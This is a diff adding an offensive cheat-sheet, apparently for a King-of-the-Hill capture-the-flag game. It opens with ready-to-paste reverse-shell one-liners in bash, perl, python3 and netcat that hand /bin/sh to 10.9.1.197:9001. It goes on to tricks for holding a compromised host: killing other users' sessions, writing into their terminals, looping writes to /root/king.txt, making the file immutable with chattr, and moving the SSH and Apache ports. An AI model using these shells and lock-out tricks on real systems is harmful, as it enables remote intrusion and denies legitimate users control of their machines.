@@ -1,0 +1,103 @@
+REVERSE_SHELLS:
+-----------------
+
+bash -i >& /dev/tcp/10.9.1.197/9001 0>&1
+
+
+perl -e 'use Socket;$i="10.9.1.197";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.1.197",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+
+nc -e /bin/sh 10.9.1.197 9001
+
+
+
+
+SEE LOGGED IN SESSIONS WITH:
+--------------------------
+
+	w, who, ps aux | grep pts
+
+
+SEE pty SESSION WITH:
+---------------------
+
+	tty
+
+
+KILL SESSIONS WITH:
+----------------------------
+
+	/dev/pts/$(NUMBER)%
+
+
+FORCE A MESSAGE/SCRIPT TO OTHER TERMINAL:
+---------------------------------------
+
+	echo "HELLO" > /dev/pts/NUMBER
+
+
+DISPLAY MESSAGES TO ALL USERS WITH:
+-----------------------------------
+
+	wall MESSAGE
+
+
+INFINITE ADDING NAME IN KING WITH:
+-----------------------------------
+
+	while true; do echo "DrAsstrange" > /root/king.txt; done;
+
+
+CHATTR & APPEND-ABLE (IMMUTABLE FILES):
+---------------------------------------
+
+	chattr +ia /root/king.txt
+
+	lsattr FILENAME
+
+	####  chattr -ia /root/king.txt   ###
+
+
+CLOBBER (DENY ">" USAGE):
+---------------------------
+
+	set -o noclobber
+
+	####  set -o clobber ####
+
+
+
+
+
+CHANGING SERVICE PORTS :
+===============================================================================================
+
+
+SSH:
+-----
+
+	sudo nano /etc/ssh/sshd_config					# IF NOT FOUND, USE 	find / -name "sshd_config" 2>/dev/null 	#
+	sudo vi /etc/ssh/sshd_config
+
+
+	EDIT: 	# PORT 22
+
+
+HTTP:
+------
+
+	sudo nano /etc/apache2/ports.conf 		[ON DEBIAN/UBUNTU]
+	sudo nano /etc/httpd/conf/httpd.conf 	[ON RHEL/CENTOS]
+
+	#####	ADD 		Listen PORT_NUMBER 		AFTER 		Listen 80
+
+	sudo  nano /etc/apache2/sites-enabled/000-default.conf 
+
+
+	#####	CHANGE VIRTUAL HOST TO PORT_NUMBER	
+
+	sudo systemctl restart apache2
